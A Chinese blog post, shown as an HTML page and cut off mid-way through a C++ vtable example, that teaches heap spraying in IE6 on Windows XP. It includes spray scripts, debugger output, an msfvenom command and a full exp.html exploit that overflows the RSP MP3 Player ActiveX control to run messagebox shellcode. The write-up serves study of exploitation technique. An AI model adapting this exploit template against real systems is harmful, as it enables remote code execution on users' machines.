<!doctype html>



  


<html class="theme-next mist use-motion">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  
  
  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Asan'world" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />






<meta name="description" content="Asanzjx Personal Blog">
<meta property="og:type" content="website">
<meta property="og:title" content="Asan'world">
<meta property="og:url" content="https://asanzjx.github.io/index.html">
<meta property="og:site_name" content="Asan'world">
<meta property="og:description" content="Asanzjx Personal Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Asan'world">
<meta name="twitter:description" content="Asanzjx Personal Blog">



<script type="text/javascript" id="hexo.configuration">
  var NexT = window.NexT || {};
  var CONFIG = {
    scheme: 'Mist',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 0,
      author: '博主'
    }
  };
</script>

  <title> Asan'world </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Asan'world</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle"></p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/11/27/FromHeapSprayToHeapFengShui/" itemprop="url">
                  从 HeapSpray( 堆喷射 ) 到 HeapFengShui( 堆风水 )
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2018-11-27T16:50:00+08:00" content="2018-11-27">
              2018-11-27
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/HeapFengShui-HeapSpray/" itemprop="url" rel="index">
                    <span itemprop="name">HeapFengShui HeapSpray</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
                &nbsp; | &nbsp;
                <a href="/2018/11/27/FromHeapSprayToHeapFengShui/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/11/27/FromHeapSprayToHeapFengShui/" itemprop="commentsCount"></span>
                </a>
              </span>
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1><span id="前言">前言</span></h1><p>HeapSpray( 堆喷射 ) 已经是项非常古老的技术（相对而言）。本文介绍的大部分内容已经不具备实战意义了，但沿着前人的脚步，可以发现这种技术背后的思想和方法是非常巧妙和有效的。</p>
<p>由于各种各样的原因，复现的成功率还是蛮低的。</p>
<p>本文首先介绍下 HeapSpray 及其相关的 js 概念，并通过一个漏洞利用来直观感受下，然后引出 HeapFengShui 的概念。</p>
<h1><span id="heapspray">HeapSpray</span></h1><p>简单来说，HeapSpray 是一种 payload 传递技术，仅用来布局 shellcode！常用于浏览器和文档型漏洞利用中！</p>
<p>最早使用heap spray技术是在2001（MS01-033）。2004年，Skylined 在 CVE-2004-1050 的 exploit \textbf{IE Iframe tag buffer exploit} 中使用到这种技术，采用的是极其经典的nops+shellcode的方式，在 2004 年后广泛运用于浏览器漏洞利用。</p>
<p>一般使用 HeapSpray 就是：</p>
<ol>
<li>喷射到 heap chunk</li>
<li>trigger a vul</li>
<li>劫持控制流 /EIP 并指向堆中</li>
</ol>
<p>IE 浏览器下的堆喷射一般都是通过 js 实现的。IE6~IE8 浏览器的堆喷射是使用 Javascript String 对象进行的。</p>
<h2><span id="基于-js-的内存分配">基于 js 的内存分配</span></h2><p>在浏览器内存中分配内存的最常见方法就是使用 javascript。这涉及到 Windows 下的 BSTR 字符串对象，jscript unescape() 函数和 js 的垃圾回收机制。</p>
<h3><span id="bstr-字符串对象验证">BSTR 字符串对象验证</span></h3><p>在 Windows 下 BSTR 字符串对象内存布局如下：<a href="https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/automat/bstr" target="_blank" rel="external">https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/automat/bstr</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header | data | terminator</span><br><span class="line">4 bytes | string(unicode) | \x00\x00</span><br></pre></td></tr></table></figure></p>
<p>在 xp sp 3 + ie6 下查看 BSTR 内存布局，js_basic1.html文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=&apos;javascript&apos;&gt;</span><br><span class="line"></span><br><span class="line">var myvar = &quot;CORELAN!&quot;;</span><br><span class="line">alert(&quot;allocation done&quot;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>ie6 打开，弹出 “allocation done” 对话框，windbg attach,搜寻字符串，查看字符串对应的内存布局<br><img src="/images/FromHeapSprayToHeapFengShui/js-1.PNG" alt="字符串内存布局"></p>
<h3><span id="jscript-unescape-验证">jscript unescape() 验证</span></h3><p>通过 unescape() 这个函数即可解决字符串 unicode 在内存的编码问题。</p>
<p>js_basic3.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language=&apos;javascript&apos;&gt;</span><br><span class="line"></span><br><span class="line">	var myvar = unescape(&apos;%u4F43%u4552&apos;); // OC ER</span><br><span class="line">	myvar += unescape(&apos;%u414C%u214E&apos;); // AL !N</span><br><span class="line">	alert(&quot;allocation done&quot;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>Windbg 搜索字符串如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; s -a 0x00000000 L?7fffffff &quot;CORELAN&quot;</span><br><span class="line">0016c2a4  43 4f 52 45 4c 41 4e 21-00 00 00 00 04 00 03 00  CORELAN!........</span><br><span class="line">0:000&gt; db 0x16c294</span><br><span class="line">0016c294  00 00 00 00 03 00 c4 00-36 01 08 00 08 00 00 00  ........6.......</span><br><span class="line">0016c2a4  43 4f 52 45 4c 41 4e 21-00 00 00 00 04 00 03 00  CORELAN!........</span><br><span class="line">0016c2b4  33 01 0c 00 06 00 00 00-f8 c4 16 00 0a 00 00 00  3...............</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>从上述可以看到，BSTR header 的数值是8，正好对应字符串长度是 8 字节。</p>
<p>使用unescape函数的最大好处就是可以使用null字节。</p>
<h3><span id="js-的垃圾回收机制">js 的垃圾回收机制</span></h3><p>在 Internet Explorer 中的 JavaScript 引擎实现了一个 CollectGarbage() 函数。</p>
<h2><span id="xpie6-heapspray">XP+IE6 HeapSpray</span></h2><p>调试环境：</p>
<ul>
<li>XP sp3</li>
<li>IE6 6.0.2900 5512</li>
<li>Windbg 6.12.0002.633 x86</li>
</ul>
<p>xp+ie6_HeapSpray_poc.html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;SCRIPT language=&quot;JavaScript&quot;&gt; </span><br><span class="line">var sc = unescape(&quot;%ucccc%ucccc&quot;); </span><br><span class="line">var nop = unescape(&quot;%u0101%u0101&quot;);</span><br><span class="line">while (nop.length &lt; 0x40000) </span><br><span class="line">	nop += nop; </span><br><span class="line">nop = nop.substring(0,0x40000-0x20-sc.length); </span><br><span class="line">heap_chunks = new Array(); </span><br><span class="line">for (i = 0 ; i &lt; 500 ; i++) </span><br><span class="line">	heap_chunks[i] = nop+sc;</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">0:006&gt; dc 0x0c0c0c0c</span><br><span class="line">0c0c0c0c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c1c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c2c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c3c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c4c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c5c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c6c  01010101 01010101 01010101 01010101  ................</span><br><span class="line">0c0c0c7c  01010101 01010101 01010101 01010101  ................</span><br></pre></td></tr></table></figure></p>
<p>直接打开这个 html 文件，IE 没有崩溃，Windbg 附加，查看 0x0c0c0c0c 处内容如上所示。如果是一个正常的内容，那么这块内存的数据是 ?。</p>
<p>解释下这段 POC, 根据前面 Windows 下使用的是 BSTR 字符串对象，所以 JavaScript 字符使用的是 2 个字节的，所以 heap_chunks 的大小实际上就是 0x40000<em>2</em>500 字节 == 262144000 字节。</p>
<p>而 0x0c0c0c0c == 202116108，所以可实现覆盖 0x0c0c0c0c。</p>
<h2><span id="观察-spray-过程">观察 spray 过程</span></h2><p>如下 spray1.html 代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script &gt;</span><br><span class="line">// heap spray test script</span><br><span class="line">// corelanc0d3r</span><br><span class="line">// Don&apos;t forget to remove the backslashes</span><br><span class="line">tag = unescape(&apos;%u4F43%u4552&apos;); // OC ER</span><br><span class="line">tag += unescape(&apos;%u414C%u214E&apos;); // AL !N</span><br><span class="line"></span><br><span class="line">chunk = &apos;&apos;;</span><br><span class="line">chunksize = 0x1000;</span><br><span class="line">nr_of_chunks = 200;</span><br><span class="line"></span><br><span class="line">for ( counter = 0; counter &lt; chunksize; counter++)</span><br><span class="line">&#123;</span><br><span class="line">chunk += unescape(&apos;%u9090%u9090&apos;);	//nops</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.write(&quot;size of NOPS at this point : &quot; + chunk.length.toString() + &quot;&lt;br&gt;&quot;);</span><br><span class="line">chunk = chunk.substring(0,chunksize - tag.length);</span><br><span class="line">document.write(&quot;size of NOPS after substring : &quot; + chunk.length.toString() + &quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">// create the array</span><br><span class="line">testarray = new Array();</span><br><span class="line">for ( counter = 0; counter &lt; nr_of_chunks; counter++)</span><br><span class="line">&#123;</span><br><span class="line">testarray[counter] = tag + chunk;</span><br><span class="line">document.write(&quot;Allocated &quot; + (tag.length+chunk.length).toString() + &quot; bytes &lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;Spray done&quot;)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="vmmap-for-windows">vmmap for windows</span></h3><p>xp 下使用 3.20 版本</p>
<p>vmmap 是微软出的实用小工具。</p>
<p>喷射前，commit 的内存块大小是 88084<br><img src="/images/FromHeapSprayToHeapFengShui/spray1.PNG" alt="Before 喷射"></p>
<p>喷射后提交的内存块是 93752<br><img src="/images/FromHeapSprayToHeapFengShui/spray2.PNG" alt="After 喷射"></p>
<h3><span id="immunitydebuggermona">ImmunityDebugger+mona</span></h3><p>mona 是 Corelan Team 团队开发的一个用 Python 编写的专门用于辅助漏洞挖掘的脚本插件。<a href="https://github.com/corelan/mona" target="_blank" rel="external">https://github.com/corelan/mona</a>，download 下来，放置在 ‘PyCommands’ 目录下。</p>
<p>搜索字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s &quot;CORELAN!&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/FromHeapSprayToHeapFengShui/mona1.PNG" alt="Mona 搜索字符串"><br>Mona找出了201个地址，其中包括前面声明变量时分配的tag，以及200个内存块前置的tag。查看find.txt（mona命令生成的），可以找到包含tag的 201 个地址。</p>
<p>查看 find.txt 最后一条数据 0x0557054c ( 即最后分配的内存数据 )<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;d 0x0557054c</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/FromHeapSprayToHeapFengShui/mona2.PNG" alt="d 0x0557054c"><br>可以看到 0x0557054c 即是 BSTR 的 header，大小是 0x2000</p>
<p>查看 0x0557054c+0x1000 ，发现填充的数据是 0x90；查看 0x0557054c + 0x2000，如下图<br><img src="/images/FromHeapSprayToHeapFengShui/mona3.PNG" alt="d 0x0557054c+0x1000"><br>可以发现到了喷射的字符串结尾。</p>
<h3><span id="windbg-查看调试情况">Windbg 查看调试情况</span></h3><p>查看堆的状况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:009&gt; !heap -p -a 0x0557054c</span><br><span class="line">address 0557054c found in</span><br><span class="line">_HEAP @ 140000</span><br><span class="line">HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">05570540 0403 0000  [01]   05570548    02010 - (busy)</span><br></pre></td></tr></table></figure></p>
<h2><span id="利用-heapspray-实现-exp">利用 HeapSpray 实现 exp</span></h2><p>ENV:</p>
<ul>
<li>RSP MP3 Player,16fc339cccdb34dd45af52de8c046d8d</li>
<li>COMRaider,User manual Reference:<a href="http://www.h3c.com/cn/d_201012/705330_30008_0.htm" target="_blank" rel="external">http://www.h3c.com/cn/d_201012/705330_30008_0.htm</a></li>
<li>OS: xp sp3 5.1.2600 + ie 6.0.2900.5512</li>
</ul>
<h3><span id="崩溃重现">崩溃重现</span></h3><p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 rspmp3ocx320sw.ocx</span><br></pre></td></tr></table></figure></p>
<p>COMRaider Start-open rspmp3ocx320sw.ocx-OpenFile-右键 fuzz number<br><img src="/images/FromHeapSprayToHeapFengShui/HeapSpray_exp1_1.PNG" alt="得到异常"></p>
<h3><span id="分析第一个异常文件-1788900268wsf">分析第一个异常文件 1788900268.wsf</span></h3><p>内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version=&apos;1.0&apos; standalone=&apos;yes&apos; ?&gt;</span><br><span class="line">&lt;package&gt;&lt;job id=&apos;DoneInVBS&apos; debug=&apos;false&apos; error=&apos;true&apos;&gt;</span><br><span class="line">&lt;object classid=&apos;clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687&apos; id=&apos;target&apos; /&gt;</span><br><span class="line">&lt;script language=&apos;vbscript&apos;&gt;</span><br><span class="line"></span><br><span class="line">&apos;File Generated by COMRaider v0.0.134 - http://labs.idefense.com</span><br><span class="line"></span><br><span class="line">&apos;Wscript.echo typename(target)</span><br><span class="line"></span><br><span class="line">&apos;for debugging/custom prolog</span><br><span class="line">targetFile = &quot;E:\binary\HeapSpray\exp_practise\rsp_mp3_ocx_3.2.0_sw\rspmp3ocx320sw.ocx&quot;</span><br><span class="line">prototype  = &quot;Function OpenFile ( ByVal Inputfile As String )&quot;</span><br><span class="line">memberName = &quot;OpenFile&quot;</span><br><span class="line">progid     = &quot;RSPMP3_320.RSPMP3&quot;</span><br><span class="line">argCount   = 1</span><br><span class="line"></span><br><span class="line">arg1=String(1044, &quot;A&quot;)</span><br><span class="line"></span><br><span class="line">target.OpenFile arg1 </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;&lt;/job&gt;&lt;/package&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看出这是个 vb 脚本</p>
<h3><span id="转换成-js-脚本">转换成 js 脚本</span></h3><p>实现控制 EIP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;object id=&quot;Oops&quot; classid=&apos;clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687&apos;&gt;&lt;/object&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	pointer=&apos;&apos;;</span><br><span class="line">	for (counter=0; counter&lt;=1000; counter++) pointer+=unescape(&quot;%06&quot;);</span><br><span class="line">	Oops.OpenFile(pointer);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="调试">调试</span></h3><p>修改 IE 设置允许加载 ActiveX 组件</p>
<p>先起 IE ,Windbg attach,g</p>
<p>IE open exp.html 文件，Windbg 如下图：<br><img src="/images/FromHeapSprayToHeapFengShui/HeapSpray_exp1_2.PNG" alt="windbg 调试界面"><br>此时单步 p, eip == 0x06060606</p>
<h3><span id="exp">exp</span></h3><p>生成 shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$msfvenom -a x86 --platform Windows -p windows/messagebox text=&apos;Hello,HeapSpray&apos; title=&apos;asanzjx&apos; -f js_le</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 262 bytes</span><br><span class="line">Final size of js_le file: 786 bytes</span><br><span class="line">%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u7a68%u786a%u6858%u7361%u6e61%udb31%u5c88%u0724%ue389%u7268%u7961%u6858%u7061%u7053%u6f68%u482c%u6865%u6548%u6c6c%uc931%u4c88%u0f24%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855</span><br></pre></td></tr></table></figure></p>
<p>所以最终的 exp.html 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;object id=&quot;Oops&quot; classid=&apos;clsid:3C88113F-8CEC-48DC-A0E5-983EF9458687&apos;&gt;&lt;/object&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">	var Shellcode = unescape(&quot;%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u7a68%u786a%u6858%u7361%u6e61%udb31%u5c88%u0724%ue389%u7268%u7961%u6858%u7061%u7053%u6f68%u482c%u6865%u6548%u6c6c%uc931%u4c88%u0f24%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855&quot;);</span><br><span class="line">	</span><br><span class="line">	var NopSlide = unescape(&apos;%u9090%u9090&apos;);</span><br><span class="line">	</span><br><span class="line">	var headersize = 20;</span><br><span class="line">	var slack = headersize + Shellcode.length;</span><br><span class="line">	while (NopSlide.length &lt; slack) NopSlide += NopSlide;</span><br><span class="line">	var filler = NopSlide.substring(0,slack);</span><br><span class="line">	var chunk = NopSlide.substring(0,NopSlide.length - slack);</span><br><span class="line">	while (chunk.length + slack &lt; 0x40000) chunk = chunk + chunk + filler;</span><br><span class="line">	var memory = new Array();</span><br><span class="line">	for (i = 0; i &lt; 500; i++)&#123; memory[i] = chunk + Shellcode &#125;</span><br><span class="line">	</span><br><span class="line">	// Trigger crash =&gt;EIP == 0x06060606</span><br><span class="line">	pointer=&apos;&apos;;</span><br><span class="line">	for (counter=0; counter&lt;=1000; counter++) pointer+=unescape(&quot;%06&quot;);</span><br><span class="line">	Oops.OpenFile(pointer);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>最终执行效果如下：<br><img src="/images/FromHeapSprayToHeapFengShui/HeapSpray_exp1_3.PNG" alt="最终执行效果"></p>
<h2><span id="为什么是-0x0c0c0c0c">为什么是 0x0c0c0c0c?</span></h2><p>关于 0x0c0c0c0c 这个地址有很多讨论。</p>
<p>一是因为堆的分布不均衡（存在碎片），所以最先分配的一些堆块的地址可能是无规律的，但是如果大量的分配堆块的话，那么就会出现稳定的地址分布。也就是说内存中碎片过多，必须喷射到更高的地址才能使 exploit 更稳定。利用JavaScript申请大量堆内存，通常申请的内存超过200MB(0xc800000)后，0x0c0c0c0c 将被含有shellcode 的内存片覆盖。只要内存片中的 0x90 能够命中0x0c0c0c0c的位置,shellcode就能最终得到执行！</p>
<p>二则涉及虚函数和多级指针。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* file name: vtable_demo.cpp</span><br><span class="line">* vs2017</span><br><span class="line">*/</span><br><span class="line">#include &lt;cstdio&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class CVirtual &#123;</span><br><span class="line">private:</span><br><span class="line">	int m_nNumber;</span><br><span class="line">public:</span><br><span class="line">	virtual int GetNumber() &#123;</span><br><span class="line">		return m_nNumber;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	virtual void SetNumber(int nNumber) &#123;</span><br><span class="line">		m_nNumber = nNumber;</span><br><span class="line">	